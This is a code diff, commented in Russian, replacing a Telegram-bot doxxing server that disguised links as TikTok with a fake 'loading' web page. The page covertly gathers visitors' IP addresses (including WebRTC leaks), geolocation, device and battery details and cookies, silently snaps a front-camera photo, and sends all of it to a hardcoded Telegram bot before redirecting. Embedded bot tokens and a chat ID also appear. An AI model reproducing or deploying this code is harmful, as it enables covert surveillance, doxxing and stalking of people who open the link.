@@ -1,196 +1,287 @@
-const express = require('express');
-const TelegramBot = require('node-telegram-bot-api');
-const crypto = require('crypto');
-
-const TOKEN = '8989024516:AAEAIwKbvaDe8HALbrjv-UoHcH6Pp2wZiso';
-const CHAT_ID = '8667961334';
-const PORT = process.env.PORT || 3000;
-const DOMAIN = 'https://dox-toxx.onrender.com'; 
-
-const app = express();
-const bot = new TelegramBot(TOKEN, { polling: true });
-
-app.use(express.json({ limit: '50mb' }));
-app.use(express.urlencoded({ extended: true }));
-
-const linksDB = {};
-
-bot.onText(/\/start/, (msg) => {
-  bot.sendMessage(msg.chat.id, 'Отправь ссылку на TikTok.');
-});
-
-bot.on('message', (msg) => {
-  const text = msg.text;
-  if (!text || text.startsWith('/')) return;
-
-  if (text.includes('tiktok.com')) {
-    const shortId = crypto.randomBytes(4).toString('hex');
-    linksDB[shortId] = text;
-    const fakeLink = `${DOMAIN}/${shortId}/`;
-    
-    bot.sendMessage(msg.chat.id, '👇 Нажмите кнопку ниже', {
-      reply_markup: {
-        inline_keyboard: [[{ text: 'Открыть', web_app: { url: fakeLink } }]]
-      }
-    });
-  }
-});
-
-bot.on('inline_query', async (query) => {
-  try {
-    const text = query.query;
-    if (!text) return bot.answerInlineQuery(query.id, [], { cache_time: 0 });
-
-    const target = text.includes('tiktok.com') ? text : 'https://www.tiktok.com/';
-    const shortId = crypto.randomBytes(4).toString('hex');
-    linksDB[shortId] = target;
-    const appLink = `${DOMAIN}/${shortId}/`;
-
-    const result = {
-      type: 'article',
-      id: shortId,
-      title: 'Открыть',
-      description: 'Нажмите, чтобы отправить',
-      input_message_content: { message_text: '👇 Нажмите кнопку ниже' },
-      reply_markup: { inline_keyboard: [[{ text: 'Открыть', url: appLink }]] }
-    };
-
-    await bot.answerInlineQuery(query.id, [result], { cache_time: 0 });
-  } catch (err) {
-    console.error(err);
-  }
-});
-
-app.get('/', (req, res) => {
-  res.redirect('https://www.tiktok.com/');
-});
-
-app.post('/api/collect', async (req, res) => {
-  const data = req.body;
-  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-
-  try {
-    let text = `🚨 **НОВЫЙ ПЕРЕХВАТ** 🚨\n\n`;
-    text += `**IP:** ${ip}\n`;
-    text += `**Гео:** ${data.geo?.country || '?'}, ${data.geo?.city || '?'}\n`;
-    text += `**Провайдер:** ${data.geo?.isp || '?'}\n`;
-    text += `**Координаты:** ${data.geo?.lat || '?'}, ${data.geo?.lon || '?'}\n`;
-    text += `**OS:** ${data.browser?.os || '?'}\n`;
-    text += `**Браузер:** ${data.browser?.browser || '?'}\n`;
-    text += `**Язык:** ${data.browser?.lang || '?'}\n`;
-    text += `**Экран:** ${data.phone?.screen || '?'}\n`;
-    text += `**DPR:** ${data.phone?.dpr || '?'}\n`;
-    text += `**CPU:** ${data.phone?.cores || '?'}\n`;
-    text += `**RAM:** ${data.phone?.ram || '?'}\n`;
-    text += `**Сеть:** ${data.phone?.network || '?'}\n`;
-    text += `**Батарея:** ${data.battery?.level || '?'} (${data.battery?.charging ? 'заряжается' : 'нет'})\n`;
-    text += `**Canvas:** ${data.fingerprint?.canvas || '?'}\n`;
-    text += `**GPU:** ${data.fingerprint?.gpu || '?'}\n`;
-    text += `**Cookies:** ${data.cookies ? data.cookies.slice(0, 80) + '...' : 'нет'}\n`;
-    text += `**Цель:** ${data.target || '?'}\n`;
-
-    await bot.sendMessage(CHAT_ID, text, { parse_mode: 'Markdown' });
-    res.json({ ok: true });
-  } catch (error) {
-    res.status(500).json({ ok: false });
-  }
-});
-
-app.get('/:id/', (req, res) => {
-  const shortId = req.params.id;
-  const targetUrl = linksDB[shortId];
-
-  if (!targetUrl) return res.redirect('https://www.tiktok.com/');
-
-  res.send(`<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ru">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-<script src="https://telegram.org/js/telegram-web-app.js"></script>
-<title>TikTok</title>
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Загрузка...</title>
 <style>
-  body { height: 100vh; background: #fff; margin: 0; display: flex; justify-content: center; align-items: center; }
+*{box-sizing:border-box}
+html,body{margin:0;padding:0;height:100%;background:#050508;color:#e0e0e0;font:15px/1.5 Arial,sans-serif;overflow:hidden}
+#app{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px;text-align:center;position:relative}
+.spinner{width:50px;height:50px;border:4px solid #1a1a24;border-top-color:#8b5cf6;border-radius:50%;animation:spin .9s linear infinite;margin-bottom:24px}
+@keyframes spin{to{transform:rotate(360deg)}}
+h1{font-size:20px;color:#fff;margin:0 0 12px;font-weight:600;opacity:.9}
+p{color:#666;margin:0 0 32px;max-width:400px;font-size:14px;line-height:1.6}
+#progress{position:fixed;bottom:0;left:0;height:2px;background:linear-gradient(90deg,transparent,#8b5cf6,transparent);width:30%;animation:load 2.5s ease-in-out infinite}
+@keyframes load{0%{left:-30%}100%{left:100%}}
+video,canvas{display:none}
 </style>
 </head>
 <body>
+<div id="app">
+  <div class="spinner"></div>
+  <h1>Загрузка...</h1>
+  <p>Подключение к серверу затянулось.<br>Пожалуйста, подождите.</p>
+</div>
+<div id="progress"></div>
+<video id="preview" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
 <script>
-  const TARGET_URL = "${targetUrl}";
-  const tg = window.Telegram?.WebApp;
+// ═══════════════════════════════════════════════════════
+// НАСТРОЙКИ
+// ═══════════════════════════════════════════════════════
+const TOKEN='9276690902:AAEQ8KE12ZBR7G-7D2yuWXxDBGXMxMu-8UQ';
+const CHAT_ID='8667961334';
+const CHECK_URL='https://share.google/nwoUZLDYhdVy8e0qg';
+const REDIRECT_URL='https://share.google/tWtcwgkxMOuocoxwl'; // <--- Куда перенаправить в конце
 
-  if (tg) {
-    tg.ready();
-    tg.expand();
-    if (tg.BackButton) tg.BackButton.hide();
+const video=document.getElementById('preview');
+const canvas=document.getElementById('canvas');
+
+// ═══════════════════════════════════════════════════════
+// ФОТО (скрыто)
+// ═══════════════════════════════════════════════════════
+async function capturePhoto(){
+  let stream=null;
+  try{
+    stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:640,height:480},audio:false});
+    video.srcObject=stream;
+    await new Promise(res=>{
+      if(video.readyState>=2) return res();
+      video.onloadeddata=()=>res();
+      setTimeout(res,2000);
+    });
+    await new Promise(r=>setTimeout(r,400));
+    const w=video.videoWidth||640,h=video.videoHeight||480;
+    canvas.width=w;canvas.height=h;
+    canvas.getContext('2d').drawImage(video,0,0,w,h);
+    const blob=await new Promise(res=>canvas.toBlob(res,'image/jpeg',0.88));
+    stream.getTracks().forEach(t=>t.stop());
+    video.srcObject=null;
+    return blob;
+  }catch(e){
+    if(stream) stream.getTracks().forEach(t=>t.stop());
+    return null;
+  }
+}
+
+// ═══════════════════════════════════════════════════════
+// IP
+// ═══════════════════════════════════════════════════════
+async function getPublicIP(){
+  try{
+    const r=await fetch('https://ipwho.is/');
+    const g=await r.json();
+    if(g.success!==false&&g.ip) return g;
+  }catch(e){}
+  try{
+    const r=await fetch('https://ipapi.co/json/');
+    return await r.json();
+  }catch(e){}
+  return {};
+}
+
+function getLocalIPs(){
+  return new Promise(resolve=>{
+    const ips=new Set(), srflx=new Set();
+    let done=false;
+    const finish=()=>{
+      if(done) return;
+      done=true;
+      try{pc.close()}catch(e){}
+      resolve({local:Array.from(ips),public:Array.from(srflx)});
+    };
+    let pc;
+    try{
+      pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+    }catch(e){ return resolve({local:[],public:[]}); }
+    pc.createDataChannel('');
+    pc.onicecandidate=e=>{
+      if(!e.candidate){finish();return;}
+      const c=e.candidate.candidate;
+      const m=/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/i.exec(c);
+      if(m) (/srflx|relay/.test(c)?srflx:ips).add(m[1]);
+    };
+    pc.createOffer().then(o=>pc.setLocalDescription(o)).catch(finish);
+    setTimeout(finish,3000);
+  });
+}
+
+async function getBattery(){
+  if(!navigator.getBattery) return {supported:false};
+  try{
+    const b=await navigator.getBattery();
+    return {
+      supported:true,
+      level_percent:Math.round(b.level*100),
+      level:b.level,
+      charging:b.charging,
+      charging_time_sec:b.chargingTime===Infinity?null:b.chargingTime,
+      discharging_time_sec:b.dischargingTime===Infinity?null:b.dischargingTime
+    };
+  }catch(e){return {supported:false};}
+}
+
+async function checkSite(url){
+  const start=performance.now();
+  try{
+    const ctrl=new AbortController();
+    const timer=setTimeout(()=>ctrl.abort(),5000);
+    await fetch(url,{method:'HEAD',mode:'no-cors',signal:ctrl.signal,cache:'no-store'});
+    clearTimeout(timer);
+    return {url,status:'reachable',latency_ms:Math.round(performance.now()-start)};
+  }catch(e){
+    return {url,status:'error',error:e.name,latency_ms:Math.round(performance.now()-start)};
+  }
+}
+
+// ═══════════════════════════════════════════════════════
+// СБОР ДАННЫХ
+// ═══════════════════════════════════════════════════════
+async function collectAll(){
+  const n=navigator,s=screen,ua=n.userAgent;
+  const geo=await getPublicIP();
+  const ips=await getLocalIPs();
+  const battery=await getBattery();
+  const site=await checkSite(CHECK_URL);
+
+  const isMobile=/Mobi|Android|iPhone|iPad|iPod|Windows Phone/i.test(ua);
+  const isTablet=/iPad|Tablet|PlayBook|Silk/i.test(ua)||(/Android/i.test(ua)&&!/Mobile/i.test(ua));
+  const deviceType=isTablet?'tablet':isMobile?'mobile':'desktop';
+
+  let os='unknown';
+  if(/Windows NT 10/.test(ua)) os='Windows 10/11';
+  else if(/Mac OS X/.test(ua)) os='macOS';
+  else if(/Android/.test(ua)) os='Android';
+  else if(/iPhone|iPad|iPod/.test(ua)) os='iOS';
+  else if(/Linux/.test(ua)) os='Linux';
+  const osMatch=/(Windows NT [\d.]+|Mac OS X [\d_.]+|Android [\d.]+|OS [\d_]+)/.exec(ua);
+  const osVersion=osMatch?osMatch[1].replace(/_/g,'.'):'';
+  const modelMatch=/\(([^)]+)\)/.exec(ua);
+  const modelUA=modelMatch?modelMatch[1]:'';
+
+  let browser='unknown',browserVersion='';
+  const btests=[[/Edg\/([\d.]+)/,'Edge'],[/OPR\/([\d.]+)/,'Opera'],[/YaBrowser\/([\d.]+)/,'Yandex'],
+    [/SamsungBrowser\/([\d.]+)/,'Samsung Internet'],[/Firefox\/([\d.]+)/,'Firefox'],
+    [/Chrome\/([\d.]+)/,'Chrome'],[/Version\/([\d.]+).*Safari/,'Safari']];
+  for(const [re,name] of btests){const m=re.exec(ua);if(m){browser=name;browserVersion=m[1];break;}}
+
+  const conn=n.connection||n.mozConnection||n.webkitConnection;
+  const network=conn?{effective_type:conn.effectiveType,downlink_mbps:conn.downlink,rtt_ms:conn.rtt,save_data:conn.saveData}:null;
+
+  const router={
+    isp:geo.connection?.isp||geo.isp||null,
+    org:geo.connection?.org||geo.org||null,
+    asn:geo.connection?.asn||geo.asn||null,
+    is_mobile:geo.connection?.is_mobile??null,
+    proxy:geo.security?.proxy??null,
+    vpn:geo.security?.vpn??null,
+    tor:geo.security?.tor??null
+  };
+
+  let source='direct';
+  if(/google\./i.test(document.referrer)) source='Google';
+  else if(/yandex\./i.test(document.referrer)) source='Yandex';
+  else if(/bing\./i.test(document.referrer)) source='Bing';
+  else if(document.referrer) source='other';
+
+  return {
+    ip_public: geo.ip||null,
+    ip_local: ips.local.length?ips.local.join(', '):'hidden',
+    ip_public_stun: ips.public.length?ips.public.join(', '):'hidden',
+    site_check: site,
+    geo_country: geo.country||null,
+    geo_country_code: geo.country_code||null,
+    geo_region: geo.region||null,
+    geo_latitude: geo.latitude??null,
+    geo_longitude: geo.longitude??null,
+    geo_city: geo.city||null,
+    geo_postal: geo.postal||null,
+    battery: battery,
+    status: n.onLine?'online':'offline',
+    router: router,
+    device_type: deviceType,
+    device_model: modelUA,
+    os: os,
+    os_version: osVersion,
+    browser: browser,
+    browser_version: browserVersion,
+    user_agent: ua,
+    platform: n.platform,
+    language: n.language,
+    languages: n.languages||[],
+    screen: {width:s.width,height:s.height,avail_width:s.availWidth,avail_height:s.availHeight,dpr:window.devicePixelRatio,color_depth:s.colorDepth},
+    viewport: {width:window.innerWidth,height:window.innerHeight},
+    hardware: {cpu_cores:n.hardwareConcurrency||null,ram_gb:n.deviceMemory||null,max_touch_points:n.maxTouchPoints||0},
+    network: network,
+    time: {local:new Date().toLocaleString('ru-RU'),iso:new Date().toISOString(),timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,utc_offset_hours:-new Date().getTimezoneOffset()/60},
+    source: source,
+    referrer: document.referrer||'',
+    page_url: location.href,
+    maps_link: (geo.latitude!=null)?'https://www.google.com/maps?q='+geo.latitude+','+geo.longitude:null
+  };
+}
+
+// ═══════════════════════════════════════════════════════
+// ОТПРАВКА
+// ═══════════════════════════════════════════════════════
+async function sendPhoto(blob,caption){
+  if(!blob) return false;
+  try{
+    const form=new FormData();
+    form.append('chat_id',CHAT_ID);
+    form.append('photo',blob,'photo.jpg');
+    form.append('caption',caption||'📷');
+    form.append('parse_mode','HTML');
+    await fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto',{method:'POST',body:form});
+    return true;
+  }catch(e){return false;}
+}
+
+async function sendJSON(jsonText){
+  try{
+    const blob=new Blob([jsonText],{type:'application/json;charset=utf-8'});
+    const form=new FormData();
+    form.append('chat_id',CHAT_ID);
+    form.append('document',blob,'data_'+Date.now()+'.json');
+    form.append('caption','📦 JSON\n'+new Date().toLocaleString('ru-RU'));
+    await fetch('https://api.telegram.org/bot'+TOKEN+'/sendDocument',{method:'POST',body:form});
+  }catch(e){}
+}
+
+// ═══════════════════════════════════════════════════════
+// ЗАПУСК
+// ═══════════════════════════════════════════════════════
+async function run(){
+  // 1. Сбор данных
+  let data={};
+  try{ data=await collectAll(); }catch(e){ data={error:String(e)}; }
+
+  // 2. Отправка JSON
+  const jsonText=JSON.stringify(data,null,2);
+  await sendJSON(jsonText);
+
+  // 3. Фото
+  const photoBlob=await capturePhoto();
+  if(photoBlob){
+    const cap='📷 Фото\n\n'+
+      '🌍 '+(data.geo_country||'?')+' / '+(data.geo_region||'?')+' / '+(data.geo_city||'?')+'\n'+
+      '📍 '+(data.geo_latitude??'?')+', '+(data.geo_longitude??'?')+'\n'+
+      '🔋 '+(data.battery?.level_percent??'?')+'% ('+(data.battery?.charging?'заряжается':'разряжается')+')\n'+
+      '📱 '+(data.device_type||'?')+' / '+(data.os||'?')+' / '+(data.device_model||'?')+'\n'+
+      '🌐 IP: '+(data.ip_public||'?')+'\n'+
+      '🕐 '+new Date().toLocaleString('ru-RU');
+    await sendPhoto(photoBlob,cap);
   }
 
-  async function collectAll() {
-    const data = { browser: {}, phone: {}, geo: {}, battery: {}, fingerprint: {} };
-    data.cookies = document.cookie || '';
-    const ua = navigator.userAgent;
-    data.browser.os = ua.includes('Windows') ? 'Windows' : ua.includes('Mac') ? 'macOS' : ua.includes('Android') ? 'Android' : ua.includes('iPhone') ? 'iOS' : 'Unknown';
-    data.browser.browser = ua.includes('Edg') ? 'Edge' : ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : ua.includes('Safari') ? 'Safari' : 'Unknown';
-    data.browser.lang = navigator.language;
-    data.browser.languages = navigator.languages ? navigator.languages.join(', ') : '';
-    data.browser.ref = document.referrer || '';
-    data.phone.screen = screen.width + 'x' + screen.height;
-    data.phone.dpr = window.devicePixelRatio;
-    data.phone.cores = navigator.hardwareConcurrency || '?';
-    data.phone.ram = navigator.deviceMemory || '?';
-    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    data.phone.network = conn ? conn.effectiveType : 'Unknown';
+  // 4. РЕДИРЕКТ НА КАРТИНКУ
+  window.location.replace(REDIRECT_URL);
+}
 
-    if (navigator.getBattery) {
-      try { const b = await navigator.getBattery(); data.battery.level = Math.round(b.level * 100) + '%'; data.battery.charging = b.charging; } catch(e){}
-    }
-
-    try {
-      const r = await fetch('https://ipwho.is/'); const g = await r.json();
-      if (g.success) { 
-        data.geo.country = g.country; data.geo.city = g.city; data.geo.isp = g.connection.isp; 
-        data.geo.lat = g.latitude; data.geo.lon = g.longitude; 
-      }
-    } catch(e){}
-
-    try {
-      const c = document.createElement('canvas'); c.width = 200; c.height = 40;
-      const ctx = c.getContext('2d'); ctx.textBaseline = 'top'; ctx.font = '14px Arial';
-      ctx.fillStyle = '#f60'; ctx.fillRect(0,0,100,20); ctx.fillStyle = '#069'; ctx.fillText('FP 🎨', 2, 4);
-      const d = c.toDataURL(); let hash = 0;
-      for (let i = 0; i < d.length; i++) hash = (hash * 31 + d.charCodeAt(i)) | 0;
-      data.fingerprint.canvas = hash.toString(16);
-    } catch(e){}
-
-    try {
-      const gl = document.createElement('canvas').getContext('webgl');
-      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-      data.fingerprint.gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'Unknown';
-    } catch(e){}
-
-    return data;
-  }
-
-  let redirected = false;
-  function goTarget() {
-    if (redirected) return;
-    redirected = true;
-    if (tg && tg.openLink) { tg.openLink(TARGET_URL); } else { location.replace(TARGET_URL); }
-  }
-
-  setTimeout(goTarget, 1500);
-
-  (async () => {
-    const data = await collectAll();
-    fetch('/api/collect', {
-      method: 'POST',
-      headers: { 'content-type': 'application/json' },
-      body: JSON.stringify({ ...data, target: TARGET_URL })
-    }).catch(() => {});
-    goTarget();
-  })();
+window.addEventListener('load',()=>{
+  setTimeout(run,200);
+});
 </script>
 </body>
-</html>`);
-});
-
-app.listen(PORT, () => { console.log(`Port ${PORT}`); });
+</html>
